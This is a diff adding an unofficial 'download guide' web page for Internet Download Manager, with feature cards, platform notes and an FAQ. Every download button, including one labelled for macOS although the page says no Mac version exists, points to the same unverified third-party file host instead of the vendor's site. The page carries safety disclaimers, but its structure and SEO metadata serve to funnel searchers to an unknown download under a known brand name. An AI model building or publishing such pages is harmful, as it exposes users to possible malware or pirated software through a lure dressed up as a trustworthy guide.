@@ -1,0 +1,232 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#101827">
+  <meta name="description" content="Learn about Internet Download Manager (IDM), its download acceleration, resume, browser integration and download organization features.">
+  <meta name="keywords" content="Internet Download Manager, IDM, download manager, download accelerator, Windows download manager">
+  <meta property="og:title" content="Internet Download Manager — Download Guide">
+  <meta property="og:description" content="Explore Internet Download Manager features, compatibility notes and download information.">
+  <title>Internet Download Manager (IDM) — Download Guide</title>
+  <style>
+    :root {
+      color-scheme: dark;
+      --bg: #0b1220;
+      --panel: #111c2e;
+      --panel-2: #17243a;
+      --text: #edf4ff;
+      --muted: #a8b7cc;
+      --blue: #4ea1ff;
+      --cyan: #54dfd0;
+      --line: rgba(180, 205, 235, .14);
+      --shadow: 0 22px 70px rgba(0,0,0,.28);
+    }
+    * { box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      margin: 0;
+      background:
+        radial-gradient(ellipse at 15% 0%, rgba(48,125,220,.20), transparent 34rem),
+        radial-gradient(ellipse at 90% 18%, rgba(48,205,190,.10), transparent 30rem),
+        var(--bg);
+      color: var(--text);
+      font: 16px/1.65 Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
+    a { color: inherit; }
+    .wrap { width: min(1120px, calc(100% - 40px)); margin-inline: auto; }
+    .topbar { border-bottom: 1px solid var(--line); background: rgba(9,16,29,.78); }
+    .nav { min-height: 72px; display:flex; align-items:center; justify-content:space-between; gap:24px; }
+    .brand { display:flex; align-items:center; gap:12px; text-decoration:none; font-weight:800; letter-spacing:-.03em; }
+    .brand-mark { width:38px; height:38px; display:grid; place-items:center; border-radius:12px; color:#071323; font-weight:900; background:linear-gradient(135deg,var(--cyan),var(--blue)); }
+    .navlinks { display:flex; gap:24px; color:var(--muted); font-size:.94rem; }
+    .navlinks a { text-decoration:none; }
+    .navlinks a:hover { color:var(--text); }
+    .hero { padding:82px 0 64px; }
+    .hero-grid { display:grid; grid-template-columns:1.2fr .8fr; align-items:center; gap:48px; }
+    .eyebrow { display:inline-flex; gap:8px; align-items:center; padding:6px 12px; border:1px solid rgba(84,223,208,.28); border-radius:999px; color:var(--cyan); background:rgba(84,223,208,.07); font-size:.82rem; font-weight:700; }
+    h1 { margin:20px 0 18px; max-width:760px; font-size:clamp(2.6rem,6vw,4.7rem); line-height:1.04; letter-spacing:-.055em; }
+    .gradient { background:linear-gradient(90deg,#fff 10%,#91c8ff 58%,#65e4d6); -webkit-background-clip:text; background-clip:text; color:transparent; }
+    .lead { max-width:660px; color:var(--muted); font-size:1.12rem; }
+    .actions { display:flex; flex-wrap:wrap; gap:12px; margin-top:28px; }
+    .btn { display:inline-flex; justify-content:center; align-items:center; gap:10px; min-height:50px; padding:0 20px; border:1px solid transparent; border-radius:12px; text-decoration:none; font-weight:800; transition:transform .18s ease, filter .18s ease; }
+    .btn:hover { transform:translateY(-2px); filter:brightness(1.08); }
+    .btn-primary { color:#061321; background:linear-gradient(110deg,var(--cyan),#79baff); box-shadow:0 10px 30px rgba(78,161,255,.2); }
+    .btn-secondary { border-color:var(--line); background:rgba(255,255,255,.04); }
+    .fineprint { color:var(--muted); font-size:.82rem; margin-top:14px; }
+    .visual { position:relative; min-height:320px; display:grid; place-items:center; }
+    .orb { position:absolute; width:260px; height:260px; border-radius:50%; background:linear-gradient(135deg,rgba(78,161,255,.22),rgba(84,223,208,.12)); filter:blur(2px); }
+    .download-card { position:relative; width:min(100%,360px); padding:26px; border:1px solid rgba(180,205,235,.2); border-radius:24px; background:linear-gradient(145deg,rgba(26,43,67,.96),rgba(14,25,42,.96)); box-shadow:var(--shadow); }
+    .window-dots { display:flex; gap:7px; margin-bottom:24px; }
+    .window-dots i { width:8px; height:8px; border-radius:50%; background:#71849d; }
+    .meter { height:10px; overflow:hidden; border-radius:99px; background:#263a54; margin:18px 0 10px; }
+    .meter span { display:block; width:76%; height:100%; border-radius:inherit; background:linear-gradient(90deg,var(--blue),var(--cyan)); }
+    .statline { display:flex; justify-content:space-between; color:var(--muted); font-size:.85rem; }
+    .section { padding:62px 0; }
+    .section-head { max-width:700px; margin-bottom:28px; }
+    h2 { margin:0 0 10px; font-size:clamp(1.8rem,4vw,2.6rem); letter-spacing:-.04em; }
+    .sub { margin:0; color:var(--muted); }
+    .features { display:grid; grid-template-columns:repeat(3,1fr); gap:16px; }
+    .feature, .panel { padding:23px; border:1px solid var(--line); border-radius:18px; background:linear-gradient(145deg,rgba(23,36,58,.88),rgba(15,26,43,.88)); }
+    .feature-icon { width:42px; height:42px; display:grid; place-items:center; margin-bottom:16px; border-radius:12px; color:var(--cyan); background:rgba(84,223,208,.1); font-size:1.25rem; }
+    h3 { margin:0 0 8px; font-size:1.08rem; }
+    .feature p, .panel p { margin:0; color:var(--muted); font-size:.94rem; }
+    .split { display:grid; grid-template-columns:1fr 1fr; gap:18px; }
+    .platform { display:flex; align-items:flex-start; gap:16px; }
+    .platform-icon { flex:0 0 44px; height:44px; display:grid; place-items:center; border-radius:12px; background:rgba(78,161,255,.12); font-size:1.35rem; }
+    .notice { margin-top:20px; padding:17px 19px; border:1px solid rgba(255,190,90,.25); border-radius:14px; background:rgba(255,190,90,.07); color:#f4d6a5; font-size:.9rem; }
+    .steps { display:grid; grid-template-columns:repeat(3,1fr); gap:16px; counter-reset:step; }
+    .step { padding:22px; border:1px solid var(--line); border-radius:16px; background:rgba(255,255,255,.025); }
+    .step:before { counter-increment:step; content:"0" counter(step); display:block; margin-bottom:12px; color:var(--cyan); font-size:1.3rem; font-weight:900; }
+    .faq { display:grid; gap:12px; }
+    details { padding:17px 20px; border:1px solid var(--line); border-radius:14px; background:rgba(255,255,255,.025); }
+    summary { cursor:pointer; font-weight:750; }
+    details p { margin:12px 0 0; color:var(--muted); }
+    footer { margin-top:36px; padding:28px 0; border-top:1px solid var(--line); color:var(--muted); font-size:.88rem; }
+    .footer-row { display:flex; justify-content:space-between; flex-wrap:wrap; gap:12px; }
+    @media (max-width:800px) {
+      .hero-grid,.split { grid-template-columns:1fr; }
+      .hero { padding-top:58px; }
+      .visual { min-height:270px; }
+      .features,.steps { grid-template-columns:repeat(2,1fr); }
+    }
+    @media (max-width:560px) {
+      .wrap { width:min(100% - 28px,1120px); }
+      .nav { min-height:64px; }
+      .navlinks { gap:12px; font-size:.82rem; }
+      .features,.steps { grid-template-columns:1fr; }
+      .hero { padding:48px 0 40px; }
+      .actions .btn { width:100%; }
+    }
+    @media (prefers-reduced-motion:reduce) {
+      html { scroll-behavior:auto; }
+      *,*::before,*::after { transition:none !important; }
+    }
+  </style>
+</head>
+<body>
+  <header class="topbar" id="top">
+    <div class="wrap nav">
+      <a class="brand" href="#top" aria-label="IDM download guide home">
+        <span class="brand-mark">IDM</span><span>Download Guide</span>
+      </a>
+      <nav class="navlinks" aria-label="Main navigation">
+        <a href="#features">Features</a>
+        <a href="#platforms">Platforms</a>
+        <a href="#faq">FAQ</a>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <section class="hero">
+      <div class="wrap hero-grid">
+        <div>
+          <span class="eyebrow">⚡ Download smarter</span>
+          <h1><span class="gradient">Internet Download Manager</span> (IDM)</h1>
+          <p class="lead">A download manager designed to accelerate file transfers, resume interrupted downloads and organize files in one place. Explore the main features and read the platform notes before downloading.</p>
+          <div class="actions">
+            <a class="btn btn-primary" href="https://executors.download/llimneyrq3jf/" target="_blank" rel="noopener noreferrer">↓ Download link <span aria-hidden="true">↗</span></a>
+            <a class="btn btn-secondary" href="#features">Explore features</a>
+          </div>
+          <p class="fineprint">Independent information page. Not affiliated with or endorsed by Tonec or the Internet Download Manager brand owner.</p>
+        </div>
+        <div class="visual" aria-label="Illustration of a download progress window">
+          <div class="orb"></div>
+          <div class="download-card">
+            <div class="window-dots"><i></i><i></i><i></i></div>
+            <div style="font-size:.78rem;color:var(--cyan);font-weight:800;letter-spacing:.08em">DOWNLOAD MANAGER</div>
+            <h3 style="font-size:1.45rem;margin-top:8px">Your downloads, organized.</h3>
+            <p style="color:var(--muted);font-size:.9rem">A simple view of transfer progress</p>
+            <div class="meter"><span></span></div>
+            <div class="statline"><span>File transfer</span><strong>In progress</strong></div>
+            <div style="height:1px;background:var(--line);margin:22px 0"></div>
+            <div class="statline"><span>Resume support</span><strong style="color:var(--cyan)">Available</strong></div>
+            <div class="statline" style="margin-top:10px"><span>Download queue</span><strong>Organized</strong></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="section" id="features">
+      <div class="wrap">
+        <div class="section-head">
+          <h2>What can Internet Download Manager do?</h2>
+          <p class="sub">IDM is known for its download acceleration technology and tools that help manage larger or interrupted transfers.</p>
+        </div>
+        <div class="features">
+          <article class="feature"><div class="feature-icon">⚡</div><h3>Download acceleration</h3><p>Uses dynamic file segmentation and multiple connections to make better use of available bandwidth.</p></article>
+          <article class="feature"><div class="feature-icon">↻</div><h3>Resume interrupted files</h3><p>Continue supported downloads after connection problems, shutdowns or other interruptions.</p></article>
+          <article class="feature"><div class="feature-icon">🌐</div><h3>Browser integration</h3><p>Can integrate with supported browsers to help capture downloads from the web.</p></article>
+          <article class="feature"><div class="feature-icon">▤</div><h3>Download categories</h3><p>Sort files into categories and keep completed and pending downloads easier to manage.</p></article>
+          <article class="feature"><div class="feature-icon">◷</div><h3>Queue and scheduler</h3><p>Queue downloads and schedule transfers for a more convenient time.</p></article>
+          <article class="feature"><div class="feature-icon">⚙</div><h3>Connection controls</h3><p>Configure connection settings and download limits to suit your network and workflow.</p></article>
+        </div>
+      </div>
+    </section>
+
+    <section class="section" id="platforms">
+      <div class="wrap">
+        <div class="section-head">
+          <h2>Choose your platform</h2>
+          <p class="sub">Check the operating-system requirements before opening an installer.</p>
+        </div>
+        <div class="split">
+          <article class="panel platform">
+            <div class="platform-icon">▣</div>
+            <div>
+              <h3>Windows download</h3>
+              <p>Internet Download Manager is a Windows application. The official product site lists support for Windows 7, 8/8.1, 10 and 11.</p>
+              <div class="actions"><a class="btn btn-primary" href="https://executors.download/llimneyrq3jf/" target="_blank" rel="noopener noreferrer">Download for Windows ↗</a></div>
+            </div>
+          </article>
+          <article class="panel platform">
+            <div class="platform-icon">⌘</div>
+            <div>
+              <h3>macOS download link</h3>
+              <p>The official IDM site does not list a native macOS version. The button below opens the same third-party URL supplied for this page; do not install it on a Mac unless the publisher confirms it is a genuine macOS-compatible app.</p>
+              <div class="actions"><a class="btn btn-secondary" href="https://executors.download/llimneyrq3jf/" target="_blank" rel="noopener noreferrer">Open macOS link ↗</a></div>
+            </div>
+          </article>
+        </div>
+        <div class="notice"><strong>Download safety:</strong> This page cannot verify the file hosted at the supplied third-party URL. Check the publisher, file type and digital signature; scan the file with reputable security software before opening it. For the official Windows installer and current compatibility details, use <a href="https://www.internetdownloadmanager.com/" target="_blank" rel="noopener noreferrer">the official IDM website</a>.</div>
+      </div>
+    </section>
+
+    <section class="section">
+      <div class="wrap">
+        <div class="section-head">
+          <h2>Before you install</h2>
+          <p class="sub">A few quick checks can help you avoid installing the wrong file.</p>
+        </div>
+        <div class="steps">
+          <article class="step"><h3>Check the source</h3><p>Confirm that the download is from a publisher or source you trust.</p></article>
+          <article class="step"><h3>Verify compatibility</h3><p>Make sure the installer matches your operating system and device architecture.</p></article>
+          <article class="step"><h3>Scan before opening</h3><p>Review the file name and signature, then scan it before running the installer.</p></article>
+        </div>
+      </div>
+    </section>
+
+    <section class="section" id="faq">
+      <div class="wrap">
+        <div class="section-head">
+          <h2>Frequently asked questions</h2>
+        </div>
+        <div class="faq">
+          <details><summary>What is Internet Download Manager?</summary><p>Internet Download Manager (IDM) is a Windows download utility that helps accelerate, resume, schedule and organize file downloads.</p></details>
+          <details><summary>Does IDM support macOS?</summary><p>The official IDM website currently lists Windows operating systems, not a native macOS release. A third-party download link should not be assumed to be a Mac installer.</p></details>
+          <details><summary>Is IDM free?</summary><p>IDM is commercial software. Its official website offers a time-limited trial; check the official site for current licensing and pricing details.</p></details>
+          <details><summary>Is the download button an official IDM link?</summary><p>No. The download buttons on this page open the third-party URL provided by the page owner. This independent page does not host or verify that file.</p></details>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <div class="wrap footer-row">
+      <span>© <span id="year">2026</span> IDM Download Guide. Independent informational page.</span>
+      <a href="#top">Back to top ↑</a>
+    </div>
+  </footer>
+</body>
+</html>
